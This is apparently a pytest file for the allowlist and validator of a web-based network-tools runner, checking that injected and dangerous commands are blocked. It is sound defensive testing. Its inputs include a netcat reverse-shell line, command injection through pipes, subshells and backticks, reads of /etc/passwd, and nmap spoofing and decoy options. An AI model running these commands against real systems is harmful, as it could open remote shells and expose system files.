# SPDX-FileCopyrightText: 2026 mmayhew
# SPDX-License-Identifier: AGPL-3.0-only

"""
Tests for command validation and rewrite logic in commands.py.

These tests cover the security-critical path: shell operator blocking, path
blocking, allowlist prefix matching, deny prefix (!), and command rewrites.
Run with: pytest tests/ (from the repo root)
"""

import unittest.mock as mock

from blueprints.run import _SyntheticPostFilterProcessor
import services.commands.registry as commands
import services.commands.raw_packets as raw_packets
from services.commands.raw_packets import raw_packet_runtime_status
from services.commands.registry import (
    command_root,
    is_command_allowed,
    parse_synthetic_postfilter,
    rewrite_command,
    runtime_missing_command_message,
    runtime_missing_command_name,
    split_command_argv,
)


# ── Helpers ───────────────────────────────────────────────────────────────────

ALLOW = ["ping", "nmap", "dig", "curl", "mtr", "traceroute", "nuclei"]
DENY  = []
_VALIDATION_REGISTRY_HELPERS = None


def _catalog_values(catalog: dict[str, object], field: str) -> list[str]:
    entries = catalog.get(field)
    assert isinstance(entries, list)
    values: list[str] = []
    for entry in entries:
        assert isinstance(entry, dict)
        value = entry.get("value")
        assert isinstance(value, str)
        values.append(value)
    return values


def _validation_registry_helpers():
    global _VALIDATION_REGISTRY_HELPERS
    if _VALIDATION_REGISTRY_HELPERS is None:
        registry = commands.load_commands_registry()
        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
            _VALIDATION_REGISTRY_HELPERS = {
                "allow_grouping": commands.load_allow_grouping_flags(),
                "workspace_flags": commands._workspace_flag_specs_by_root(),
                "runtime_adaptations": commands._runtime_adaptations_by_root(),
            }
    return _VALIDATION_REGISTRY_HELPERS


def _check(cmd, allow=None, deny=None):
    """Call is_command_allowed with a mocked allowlist."""
    a = allow if allow is not None else ALLOW
    d = deny  if deny  is not None else DENY
    helpers = _validation_registry_helpers()
    with mock.patch("services.commands.registry.load_command_policy", return_value=(a, d)), \
         mock.patch("services.commands.registry.load_allow_grouping_flags", return_value=helpers["allow_grouping"]), \
         mock.patch("services.commands.registry._workspace_flag_specs_by_root", return_value=helpers["workspace_flags"]), \
         mock.patch("services.commands.registry._runtime_adaptations_by_root", return_value=helpers["runtime_adaptations"]):
        return is_command_allowed(cmd)


# ── Shell operator blocking ────────────────────────────────────────────────────

class TestShellOperators:
    def test_pipe(self):
        ok, _ = _check("ping | cat /etc/passwd")
        assert not ok

    def test_double_ampersand(self):
        ok, _ = _check("ping google.com && id")
        assert not ok

    def test_semicolon(self):
        ok, _ = _check("ping google.com ; id")
        assert not ok

    def test_double_pipe(self):
        ok, _ = _check("ping google.com || id")
        assert not ok

    def test_backtick(self):
        ok, _ = _check("ping `id`")
        assert not ok

    def test_dollar_subshell(self):
        ok, _ = _check("ping $(id)")
        assert not ok

    def test_redirect_out(self):
        ok, _ = _check("ping google.com > /etc/passwd")
        assert not ok

    def test_redirect_append(self):
        ok, _ = _check("ping google.com >> /tmp/x")
        assert not ok

    def test_redirect_in(self):
        ok, _ = _check("curl darklab.sh < /etc/passwd")
        assert not ok

    def test_synthetic_grep_pipe_allowed(self):
        ok, _ = _check("ping darklab.sh | grep ttl")
        assert ok

    def test_synthetic_grep_dash_pattern_pipe_allowed(self):
        ok, _ = _check("nmap darklab.sh | grep '-script'")
        assert ok

        ok, _ = _check("nmap darklab.sh | grep -- -script")
        assert ok

        ok, _ = _check("nmap darklab.sh | grep -e '-script'")
        assert ok

    def test_synthetic_head_pipe_allowed(self):
        ok, _ = _check("ping darklab.sh | head -n 5")
        assert ok

    def test_synthetic_tail_pipe_allowed(self):
        ok, _ = _check("ping darklab.sh | tail")
        assert ok

    def test_synthetic_wc_pipe_allowed(self):
        ok, _ = _check("ping darklab.sh | wc -l")
        assert ok


# ── Path blocking ─────────────────────────────────────────────────────────────

class TestPathBlocking:
    def test_data_path(self):
        ok, _ = _check("curl /data/history.db")
        assert not ok

    def test_tmp_path(self):
        ok, _ = _check("curl /tmp/secret")
        assert not ok

    def test_url_with_data_segment(self):
        # URLs like https://darklab.sh/data/file should NOT be blocked
        ok, _ = _check("curl https://darklab.sh/data/file")
        assert ok

    def test_url_with_tmp_segment(self):
        ok, _ = _check("curl https://darklab.sh/tmp/thing")
        assert ok


# ── Loopback address blocking ─────────────────────────────────────────────────

class TestLoopbackBlocking:
    def test_localhost_bare(self):
        ok, _ = _check("curl localhost:8888/diag")
        assert not ok

    def test_localhost_url(self):
        ok, _ = _check("curl http://localhost:8888/faq")
        assert not ok

    def test_loopback_ip_with_port(self):
        ok, _ = _check("curl 127.0.0.1:8888/health")
        assert not ok

    def test_loopback_ip_url(self):
        ok, _ = _check("curl http://127.0.0.1:8888/health")
        assert not ok

    def test_zero_addr(self):
        ok, _ = _check("curl 0.0.0.0")
        assert not ok

    def test_ipv6_loopback(self):
        ok, _ = _check("curl http://[::1]:8888/diag")
        assert not ok

    def test_nc_localhost(self):
        ok, _ = _check("nc localhost 8888", allow=["nc"])
        assert not ok

    def test_no_false_positive_on_hostname(self):
        # "notlocalhost.com" must not be caught by the \blocalhost\b boundary
        ok, _ = _check("curl https://notlocalhost.com/page")
        assert ok


# ── Allowlist prefix matching ─────────────────────────────────────────────────

class TestAllowlist:
    def test_exact_match(self):
        ok, _ = _check("ping")
        assert ok

    def test_prefix_with_args(self):
        ok, _ = _check("ping -c 4 google.com")
        assert ok

    def test_not_in_list(self):
        ok, _ = _check("nc -e /bin/sh 10.0.0.1 4444")
        assert not ok

    def test_prefix_must_have_space(self):
        # "pingreally" should NOT match the "ping" prefix
        ok, _ = _check("pingreally google.com")
        assert not ok

    def test_unrestricted_when_no_file(self):
        with mock.patch("services.commands.registry.load_command_policy", return_value=(None, [])):
            ok, _ = is_command_allowed("anything goes")
        assert ok

    def test_case_insensitive(self):
        ok, _ = _check("PING google.com")
        assert ok

    def test_chained_synthetic_pipe_helpers_allowed(self):
        ok, _ = _check("ping darklab.sh | grep ttl | wc -l")
        assert ok


class TestSyntheticGrepParsing:
    def test_parses_basic_synthetic_grep(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep ttl")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "grep"
        assert spec["stages"] == [{
            "kind": "grep",
            "pattern": "ttl",
            "ignore_case": False,
            "invert_match": False,
            "extended": False,
        }]

    def test_parses_combined_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep -iv ttl")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["ignore_case"] is True
        assert spec["stages"][0]["invert_match"] is True

    def test_parses_extended_regex_pattern(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep -E 'ttl|time'")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["extended"] is True
        assert spec["stages"][0]["pattern"] == "ttl|time"

    def test_parses_option_terminator_pattern_starting_with_dash(self):
        quoted, quoted_err = parse_synthetic_postfilter("man nmap | grep '-script'")
        assert quoted_err is None
        assert quoted is not None
        assert quoted["stages"][0]["pattern"] == "-script"

        spec, err = parse_synthetic_postfilter("man nmap | grep -- -script")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "man nmap"
        assert spec["stages"][0]["pattern"] == "-script"

    def test_parses_dash_e_pattern_starting_with_dash(self):
        spec, err = parse_synthetic_postfilter("man nmap | grep -i -e '-script'")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["ignore_case"] is True
        assert spec["stages"][0]["pattern"] == "-script"

    def test_rejects_missing_pattern(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep -i")
        assert spec is None
        assert err == "Synthetic grep requires a pattern."

    def test_rejects_unsupported_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep -n ttl")
        assert spec is None
        assert err == "Synthetic grep supports only -i, -v, and -E."

        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep -script")
        assert spec is None
        assert err == "Synthetic grep supports only -i, -v, and -E."

    def test_rejects_extra_operands(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep ttl file.txt")
        assert spec is None
        assert err == "Synthetic grep only supports a single pattern argument."


class TestSyntheticPostFilterParsing:
    def test_parses_default_head(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | head")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "head"
        assert spec["stages"] == [{"kind": "head", "count": 10}]

    def test_parses_tail_with_explicit_count(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | tail -n 25")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "tail"
        assert spec["stages"] == [{"kind": "tail", "count": 25}]

    def test_parses_wc_line_count(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | wc -l")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "wc_l"
        assert spec["stages"] == [{"kind": "wc_l"}]

    def test_parses_head_with_short_count_flag(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | head -5")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["stages"] == [{"kind": "head", "count": 5}]

    def test_parses_tail_with_short_count_flag(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | tail -20")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["stages"] == [{"kind": "tail", "count": 20}]

    def test_rejects_invalid_head_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | head -n")
        assert spec is None
        assert err == "Synthetic head supports only `-n <count>` or `-<count>`."

    def test_rejects_non_numeric_tail_count(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | tail -n five")
        assert spec is None
        assert err == "Synthetic tail requires a non-negative numeric count."

    def test_rejects_wc_modes_other_than_line_count(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | wc -c")
        assert spec is None
        assert err == "Synthetic wc supports only `wc -l`."

    def test_parses_sort_default(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | sort")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "sort"
        assert spec["stages"] == [{"kind": "sort", "reverse": False, "numeric": False, "unique": False}]

    def test_parses_sort_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | sort -rn")
        assert err is None
        assert spec is not None
        stage = spec["stages"][0]
        assert stage["reverse"] is True and stage["numeric"] is True and stage["unique"] is False

    def test_parses_sort_unique(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | sort -u")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["unique"] is True

    def test_parses_sort_all_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | sort -rnu")
        assert err is None
        assert spec is not None
        stage = spec["stages"][0]
        assert stage["reverse"] is True and stage["numeric"] is True and stage["unique"] is True

    def test_rejects_invalid_sort_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | sort -x")
        assert spec is None
        assert err == "Synthetic sort supports only -r, -n, and -u flags."

    def test_parses_uniq_default(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | uniq")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "uniq"
        assert spec["stages"] == [{"kind": "uniq", "count": False}]

    def test_parses_uniq_count(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | uniq -c")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["count"] is True

    def test_rejects_invalid_uniq_flags(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | uniq -d")
        assert spec is None
        assert err == "Synthetic uniq supports only -c."

    def test_parses_chained_synthetic_helpers(self):
        spec, err = parse_synthetic_postfilter("ping darklab.sh | grep ttl | wc -l")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "ping darklab.sh"
        assert spec["kind"] == "grep"
        assert spec["stages"] == [
            {"kind": "grep", "pattern": "ttl", "ignore_case": False, "invert_match": False, "extended": False},
            {"kind": "wc_l"},
        ]

    def test_parses_jq_field_selector(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq -r .host")
        assert err is None
        assert spec is not None
        assert spec["base_command"] == "curl https://example.test/data.json"
        assert spec["kind"] == "jq"
        assert spec["stages"] == [{
            "kind": "jq",
            "selector": {"op": "field", "path": ["host"]},
            "raw": True,
            "compact": False,
        }]

        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq -c .host")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["compact"] is True

    def test_parses_jq_jsonl_filters(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.jsonl | jq 'select(.status == \"ok\")'")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["selector"] == {"op": "filter_eq", "path": ["status"], "value": "ok"}

        spec, err = parse_synthetic_postfilter("curl https://example.test/data.jsonl | jq 'select(has(\"ip\"))'")
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["selector"] == {"op": "filter_has", "path": ["ip"]}

        spec, err = parse_synthetic_postfilter(
            "curl https://example.test/data.jsonl | jq 'select(.title contains \"login\")'"
        )
        assert err is None
        assert spec is not None
        assert spec["stages"][0]["selector"] == {"op": "filter_contains", "path": ["title"], "value": "login"}

    def test_parses_jq_selector_fixture_parity(self):
        accepted = [
            ".",
            ".[]",
            ".host",
            ".results[]",
            ".nested.host-name",
            'select(has("ip"))',
            'select(.status == "ok")',
            'select(.status=="ok")',
            'select(.title contains "login")',
        ]
        rejected = [
            'select(.title contains"login")',
            'select(.titlecontains "login")',
            'select(.status = "ok")',
            'select(.title | contains("login"))',
            ".[0]",
            ".secret; cat /etc/passwd",
        ]

        for expression in accepted:
            spec, err = parse_synthetic_postfilter(f"curl https://example.test/data.jsonl | jq '{expression}'")
            assert err is None, expression
            assert spec is not None, expression

        for expression in rejected:
            spec, err = parse_synthetic_postfilter(f"curl https://example.test/data.jsonl | jq '{expression}'")
            assert spec is None, expression
            assert err == "Synthetic jq supports only field selectors, array iteration, and simple select filters."

    def test_applies_jq_selector_to_json_scalars(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.jsonl | jq -c 'select(.verified == \"true\")'")
        assert err is None
        processor = _SyntheticPostFilterProcessor(spec)

        assert processor.process_output_line('{"host":"one.test","verified":true}\n') == []
        assert processor.process_output_line('{"host":"two.test","verified":false}\n') == []
        assert processor.finalize_output_lines() == ['{"host":"one.test","verified":true}\n']

        spec, err = parse_synthetic_postfilter("curl https://example.test/data.jsonl | jq -c 'select(.note == \"null\")'")
        assert err is None
        processor = _SyntheticPostFilterProcessor(spec)

        assert processor.process_output_line('{"host":"one.test","note":null}\n') == []
        assert processor.process_output_line('{"host":"two.test"}\n') == []
        assert processor.finalize_output_lines() == ['{"host":"one.test","note":null}\n']

    def test_rejects_unsupported_jq_selectors(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq '.[0] | .secret'")
        assert spec is None
        assert err == "Synthetic jq supports only field selectors, array iteration, and simple select filters."

        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq '.secret; cat /etc/passwd'")
        assert spec is None
        assert err == "Synthetic jq supports only field selectors, array iteration, and simple select filters."

    def test_applies_jq_selector_to_jsonl_without_leaking_malformed_input(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.jsonl | jq -r .host")
        assert err is None
        processor = _SyntheticPostFilterProcessor(spec)

        assert processor.process_output_line('{"host":"one.test","secret":"SHOULD_NOT_LEAK"}\n') == []
        assert processor.process_output_line("not-json SHOULD_NOT_LEAK\n") == []
        result = processor.finalize_output_lines()

        assert result == ["[error] jq expected JSON or JSONL input\n"]
        assert "SHOULD_NOT_LEAK" not in "".join(result)

    def test_applies_jq_selector_and_output_caps(self):
        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq .")
        assert err is None
        processor = _SyntheticPostFilterProcessor(spec)
        assert processor.process_output_line('{"host":"one.test","ports":[80,443]}\n') == []
        assert processor.finalize_output_lines() == [
            "{\n",
            '  "host": "one.test",\n',
            '  "ports": [\n',
            "    80,\n",
            "    443\n",
            "  ]\n",
            "}\n",
        ]

        spec, err = parse_synthetic_postfilter("curl https://example.test/data.json | jq -c .items[]")
        assert err is None
        processor = _SyntheticPostFilterProcessor(spec)
        assert processor.process_output_line('{"items":[{"host":"one.test"},{"host":"two.test"}]}\n') == []
        assert processor.finalize_output_lines() == ['{"host":"one.test"}\n', '{"host":"two.test"}\n']

        capped = _SyntheticPostFilterProcessor(spec)
        capped.process_output_line('{"items":[' + ",".join(str(index) for index in range(1001)) + "]}\n")
        assert capped.finalize_output_lines() == ["[error] jq output exceeded the 1000-line safety cap\n"]


# ── Deny prefix (!) ───────────────────────────────────────────────────────────

class TestDenyPrefix:
    def test_deny_takes_priority(self):
        ok, _ = _check("nmap -sU 10.0.0.1", allow=["nmap"], deny=["nmap -sU"])
        assert not ok
        raw_ok, raw_reason = _check("nmap -sSV 10.0.0.1", allow=["nmap"], deny=[])
        assert not raw_ok
        assert "-sS" in raw_reason

    def test_allow_still_works_without_denied_flag(self):
        ok, _ = _check("nmap -sT 10.0.0.1", allow=["nmap"], deny=["nmap -sU"])
        assert ok

    def test_raw_packet_opt_in_requires_readiness_and_keeps_managed_boundaries(self):
        assert raw_packets._has_effective_permitted_file_capability(
            "/usr/bin/nmap cap_net_admin,cap_net_raw=eip",
            "cap_net_raw",
        )
        assert not raw_packets._has_effective_permitted_file_capability(
            "/usr/bin/nmap cap_net_raw=ip",
            "cap_net_raw",
        )
        assert not raw_packets._has_effective_permitted_file_capability(
            "/usr/bin/nmap cap_net_raw=i",
            "cap_net_raw",
        )
        ready = {
            "linux": True,
            "cap_net_raw_bounded": True,
            "no_new_privileges": False,
            "restricted_cidr_firewall_ready": True,
            "restricted_cidr_firewall_cidrs": ("192.0.2.0/24",),
            "tools": {
                tool: {
                    "available": True,
                    "binary_present": True,
                    "file_cap_net_raw": True,
                    "path": f"/usr/bin/{tool}",
                }
                for tool in ("nmap", "naabu", "masscan")
            },
        }
        disabled_cfg = commands.app_config.CFG.with_overrides({"raw_packet_scanning_enabled": False})
        raw_catalog_flags = {
            "-sA", "-sF", "-sI", "-sM", "-sN", "-sO", "-sS", "-sU", "-sW", "-sX", "-sY", "-sZ",
            "-A", "-O", "--osscan-guess", "--osscan-limit", "--traceroute",
            "-PE", "-PP", "-PM", "-PS", "-PA", "-PU", "-PY", "-PR", "-PO",
            "-f", "--mtu", "--send-ip",
        }
        disabled_flags = {
            item["value"]
            for item in commands.load_autocomplete_context_from_commands_registry(disabled_cfg)["nmap"]["flags"]
        }
        assert raw_catalog_flags.isdisjoint(disabled_flags)
        disabled_catalog = commands.command_catalog_entry("nmap", cfg=disabled_cfg)
        assert disabled_catalog is not None
        assert raw_catalog_flags.isdisjoint(_catalog_values(disabled_catalog, "flags"))
        disabled_masscan_catalog = commands.command_catalog_entry("masscan", cfg=disabled_cfg)
        assert disabled_masscan_catalog is not None
        assert _catalog_values(disabled_masscan_catalog, "examples") == ["masscan --help"]
        disabled_nmap = commands.validate_command("nmap -p 80 example.com", cfg=disabled_cfg)
        assert disabled_nmap.allowed
        assert rewrite_command(disabled_nmap.exec_command, cfg=disabled_cfg)[0].startswith("nmap -sT ")
        assert raw_packets.scan_transport("nmap example.com", disabled_cfg) == "connect"
        assert raw_packets.scan_transport("naabu -host example.com", disabled_cfg) == "connect"
        assert not commands.validate_command("nmap -sS -p 80 example.com", cfg=disabled_cfg).allowed
        for raw_command in (
            "nmap -PR example.com",
            "nmap -PO example.com",
            "nmap -f example.com",
            "nmap --mtu 24 example.com",
            "nmap --send-ip example.com",
            "nmap -e eth0 example.com",
            "nmap -g 53 example.com",
            "nmap --data-length 12 example.com",
            "nmap --badsum example.com",
        ):
            assert not commands.validate_command(raw_command, cfg=disabled_cfg).allowed
        assert not commands.validate_command("masscan -p 80 192.0.2.1", cfg=disabled_cfg).allowed
        disabled_naabu = commands.validate_command("naabu -host example.com -p 80", cfg=disabled_cfg)
        assert rewrite_command(disabled_naabu.exec_command, cfg=disabled_cfg)[0].startswith("naabu -scan-type c ")

        cfg = commands.app_config.CFG.with_overrides({"raw_packet_scanning_enabled": True})
        with mock.patch(
            "services.commands.raw_packets._raw_packet_system_readiness",
            return_value=ready,
        ):
            disabled_status = raw_packet_runtime_status(disabled_cfg)
            assert disabled_status["available"] is True
            assert disabled_status["active"] is False
            default_nmap = commands.validate_command("nmap -p 80 example.com", cfg=cfg)
            assert default_nmap.allowed
            assert default_nmap.exec_command == "nmap -p 80 example.com"
            assert rewrite_command(default_nmap.exec_command, cfg=cfg)[0] == (
                "env NMAP_PRIVILEGED=1 nmap -p 80 example.com"
            )

            syn_nmap = commands.validate_command("nmap -sS -p 80 example.com", cfg=cfg)
            assert syn_nmap.allowed
            assert "NMAP_PRIVILEGED=1" in rewrite_command(syn_nmap.exec_command, cfg=cfg)[0]
            assert commands.validate_command("nmap -sU -O --traceroute example.com", cfg=cfg).allowed
            assert commands.validate_command("nmap -PR -f --mtu 24 --send-ip example.com", cfg=cfg).allowed
            assert not commands.validate_command("nmap -sT -O example.com", cfg=cfg).allowed
            for blocked_option in ("-D decoy.example", "-S 192.0.2.10", "--spoof-mac 0", "--send-eth"):
                rejected_option = commands.validate_command(f"nmap {blocked_option} example.com", cfg=cfg)
                assert not rejected_option.allowed
                assert "blocked" in rejected_option.reason
            enabled_flags = {
                item["value"]
                for item in commands.load_autocomplete_context_from_commands_registry(cfg)["nmap"]["flags"]
            }
            assert raw_catalog_flags.issubset(enabled_flags)
            enabled_catalog = commands.command_catalog_entry("nmap", cfg=cfg)
            assert enabled_catalog is not None
            assert raw_catalog_flags.issubset(_catalog_values(enabled_catalog, "flags"))
            enabled_masscan_catalog = commands.command_catalog_entry("masscan", cfg=cfg)
            assert enabled_masscan_catalog is not None
            assert "masscan -p 80,443 8.8.8.8" in _catalog_values(
                enabled_masscan_catalog,
                "examples",
            )
            nmap_policy = next(
                item for item in commands.load_commands_registry()["commands"] if item["root"] == "nmap"
            )["policy"]
            assert "nmap -sS" not in nmap_policy["deny"]
            assert "nmap -O" not in nmap_policy["deny"]
            assert not commands.validate_command("curl -O https://example.com", cfg=cfg).allowed

            connect_nmap = commands.validate_command("nmap -sT -p 80 example.com", cfg=cfg)
            assert connect_nmap.allowed
            assert connect_nmap.exec_command == "nmap -sT -p 80 example.com"
            assert rewrite_command(connect_nmap.exec_command, cfg=cfg)[0] == connect_nmap.exec_command

            assert not commands.validate_command("nmap --privileged example.com", cfg=cfg).allowed
            naabu = commands.validate_command("naabu -host example.com -p 80", cfg=cfg)
            assert naabu.allowed
            assert rewrite_command(naabu.exec_command, cfg=cfg)[0].startswith("naabu -scan-type s ")
            connect_naabu = commands.validate_command(
                "naabu -scan-type c -host example.com -p 80",
                cfg=cfg,
            )
            assert rewrite_command(connect_naabu.exec_command, cfg=cfg)[0] == connect_naabu.exec_command
            assert commands.validate_command("masscan -p 80 192.0.2.1", cfg=cfg).allowed
            assert raw_packets.scan_transport("nmap -sS example.com", cfg) == "raw"
            assert raw_packets.scan_transport("nmap -sT example.com", cfg) == "connect"
            assert raw_packets.scan_transport("nmap -sL example.com", cfg) == ""
            assert raw_packets.scan_transport("nmap -h", cfg) == ""
            assert raw_packets.scan_transport("naabu -scan-type=s -host example.com", cfg) == "raw"
            assert raw_packets.scan_transport("naabu -st=connect -host example.com", cfg) == "connect"
            assert raw_packets.scan_transport("naabu -help", cfg) == ""
            assert raw_packets.scan_transport("masscan -p 80 192.0.2.1", cfg) == "raw"
            assert raw_packets.scan_transport("masscan --help", cfg) == ""
            assert raw_packets.scan_transport("curl https://example.com", cfg) == ""

            restricted_cfg = cfg.with_overrides({"restricted_command_input_cidrs": ["192.0.2.0/24"]})
            assert not commands.validate_command(
                "nmap -sS -p 80 192.0.2.1",
                cfg=restricted_cfg,
            ).allowed
            restricted_hostname = commands.validate_command(
                "nmap -sS -p 80 restricted.example",
                cfg=restricted_cfg,
            )
            assert restricted_hostname.allowed
            assert rewrite_command(
                restricted_hostname.exec_command,
                cfg=restricted_cfg,
            )[0].startswith("env NMAP_PRIVILEGED=1 nmap --send-ip ")
            assert not commands.validate_command(
                "nmap -sS --send-eth restricted.example",
                cfg=restricted_cfg,
            ).allowed
            assert not commands.validate_command(
                "masscan -p 80 198.51.100.1",
                cfg=restricted_cfg,
            ).allowed
            restricted_masscan_catalog = commands.command_catalog_entry("masscan", cfg=restricted_cfg)
            assert restricted_masscan_catalog is not None
            assert _catalog_values(restricted_masscan_catalog, "examples") == ["masscan --help"]

        firewall_missing = {**ready, "restricted_cidr_firewall_ready": False}
        with mock.patch(
            "services.commands.raw_packets._raw_packet_system_readiness",
            return_value=firewall_missing,
        ):
            firewall_status = raw_packet_runtime_status(restricted_cfg)
            assert firewall_status["active"] is False
            assert firewall_status["reason"] == "restricted_cidr_firewall_unavailable"
            rejected = commands.validate_command("nmap -sS restricted.example", cfg=restricted_cfg)
            assert not rejected.allowed
            assert "firewall rules are not confirmed" in rejected.reason

        unavailable = {**ready, "cap_net_raw_bounded": False}
        with mock.patch(
            "services.commands.raw_packets._raw_packet_system_readiness",
            return_value=unavailable,
        ):
            rejected = commands.validate_command("nmap -sS -p 80 example.com", cfg=cfg)
            assert not rejected.allowed
            assert "CAP_NET_RAW" in rejected.reason
            fallback = commands.validate_command("nmap -p 80 example.com", cfg=cfg)
            assert fallback.allowed
            assert rewrite_command(fallback.exec_command, cfg=cfg)[0].startswith("nmap -sT ")

        for readiness, reason in (
            ({**ready, "no_new_privileges": True}, "no-new-privileges"),
            ({
                **ready,
                "tools": {
                    **ready["tools"],
                    "nmap": {
                        **ready["tools"]["nmap"],
                        "file_cap_net_raw": False,
                    },
                },
            }, "file capability"),
        ):
            with mock.patch(
                "services.commands.raw_packets._raw_packet_system_readiness",
                return_value=readiness,
            ):
                rejected = commands.validate_command("nmap -sS example.com", cfg=cfg)
                assert not rejected.allowed
                assert reason in rejected.reason

    def test_raw_packet_nmap_option_matrix_tracks_runtime_state(self):
        ready = {
            "linux": True,
            "cap_net_raw_bounded": True,
            "no_new_privileges": False,
            "restricted_cidr_firewall_ready": True,
            "restricted_cidr_firewall_cidrs": (),
            "tools": {
                tool: {
                    "available": True,
                    "binary_present": True,
                    "file_cap_net_raw": True,
                    "path": f"/usr/bin/{tool}",
                }
                for tool in ("nmap", "naabu", "masscan")
            },
        }
        disabled_cfg = commands.app_config.CFG.with_overrides({"raw_packet_scanning_enabled": False})
        enabled_cfg = commands.app_config.CFG.with_overrides({"raw_packet_scanning_enabled": True})
        raw_dependent_commands = (
            "nmap -PR example.com",
            "nmap -PO2 example.com",
            "nmap -f example.com",
            "nmap --mtu 24 example.com",
            "nmap --mtu=24 example.com",
            "nmap --send-ip example.com",
            "nmap -e eth0 example.com",
            "nmap -eeth0 example.com",
            "nmap -g 53 example.com",
            "nmap -g53 example.com",
            "nmap --source-port 53 example.com",
            "nmap --source-port=53 example.com",
            "nmap --data abcd example.com",
            "nmap --data=abcd example.com",
            "nmap --data-string payload example.com",
            "nmap --data-string=payload example.com",
            "nmap --data-length 12 example.com",
            "nmap --data-length=12 example.com",
            "nmap --ip-options R example.com",
            "nmap --ip-options=R example.com",
            "nmap --ttl 64 example.com",
            "nmap --ttl=64 example.com",
            "nmap --badsum example.com",
            "nmap --adler32 example.com",
        )
        always_denied_commands = (
            "nmap --privileged example.com",
            "nmap -D decoy.example example.com",
            "nmap -Ddecoy.example example.com",
            "nmap -S 192.0.2.10 example.com",
            "nmap -S192.0.2.10 example.com",
            "nmap --spoof-mac 0 example.com",
            "nmap --spoof-mac=0 example.com",
            "nmap --send-eth example.com",
        )

        for raw_command in raw_dependent_commands:
            rejected = commands.validate_command(raw_command, cfg=disabled_cfg)
            assert not rejected.allowed, raw_command
            assert "raw-packet scanning is disabled" in rejected.reason

        with mock.patch(
            "services.commands.raw_packets._raw_packet_system_readiness",
            return_value=ready,
        ):
            for raw_command in raw_dependent_commands:
                assert commands.validate_command(raw_command, cfg=enabled_cfg).allowed, raw_command
            for blocked_command in always_denied_commands:
                rejected = commands.validate_command(blocked_command, cfg=enabled_cfg)
                assert not rejected.allowed, blocked_command
                assert "blocked" in rejected.reason

    def test_raw_packet_readiness_probes_fail_closed_and_clear_cached_state(self, tmp_path):
        status_path = tmp_path / "status"
        status_path.write_text("CapBnd:\t0000000000002000\nNoNewPrivs:\t0\nIgnored line\n")
        assert raw_packets._proc_status_fields(status_path) == {
            "CapBnd": "0000000000002000",
            "NoNewPrivs": "0",
        }
        assert raw_packets._proc_status_fields(tmp_path / "missing-status") == {}

        getcap_result = mock.Mock(stdout="/usr/bin/nmap cap_net_raw=eip\n")
        with (
            mock.patch("services.commands.raw_packets.shutil.which", return_value="/usr/sbin/getcap"),
            mock.patch("services.commands.raw_packets.subprocess.run", return_value=getcap_result) as run_getcap,
        ):
            assert raw_packets._file_capabilities("/usr/bin/nmap") == "/usr/bin/nmap cap_net_raw=eip"
        run_getcap.assert_called_once_with(
            ["/usr/sbin/getcap", "/usr/bin/nmap"],
            check=False,
            capture_output=True,
            text=True,
            timeout=2,
        )
        with mock.patch("services.commands.raw_packets.shutil.which", return_value=None):
            assert raw_packets._file_capabilities("/usr/bin/nmap") == ""
        with (
            mock.patch("services.commands.raw_packets.shutil.which", return_value="/usr/sbin/getcap"),
            mock.patch(
                "services.commands.raw_packets.subprocess.run",
                side_effect=raw_packets.subprocess.TimeoutExpired(["getcap"], 2),
            ),
        ):
            assert raw_packets._file_capabilities("/usr/bin/nmap") == ""

        binary_paths = {tool: f"/usr/bin/{tool}" for tool in raw_packets.RAW_PACKET_TOOLS}
        with (
            mock.patch(
                "services.commands.raw_packets._proc_status_fields",
